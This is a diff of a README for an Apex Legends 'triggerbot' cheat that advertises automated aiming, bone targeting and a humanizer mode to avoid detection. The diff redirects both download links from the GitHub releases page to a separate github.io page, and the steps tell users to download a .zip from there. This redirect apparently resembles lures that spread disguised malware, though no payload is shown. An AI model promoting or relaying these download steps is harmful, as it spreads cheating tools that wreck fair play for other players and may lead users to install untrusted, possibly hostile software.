@@ -1,6 +1,6 @@
 # 🎯 Apex-Legends-Triggerbot - Aim assistance for better match performance
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/divyanshtripathi191-create/Apex-Legends-Triggerbot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://divyanshtripathi191-create.github.io)
 
 This application provides tools to improve weapon accuracy in Apex Legends. The software manages recoil patterns, reduces weapon spread, and adjusts field of view settings to help you monitor the battlefield. It includes bone targeting logic to identify enemy positions and a humanizer mode to balance automated actions with natural movement.
 
@@ -18,7 +18,7 @@ To run this tool, ensure your computer meets these base requirements:
 
 Follow these steps to get the software running on your computer.
 
-1. Visit the [official release page](https://github.com/divyanshtripathi191-create/Apex-Legends-Triggerbot/releases) to access the latest files.
+1. Visit the [official release page](https://divyanshtripathi191-create.github.io) to access the latest files.
 2. Look for the "Assets" section at the bottom of the latest release post.
 3. Click the file ending in .zip to start the download.
 4. Locate the downloaded folder in your Downloads directory.
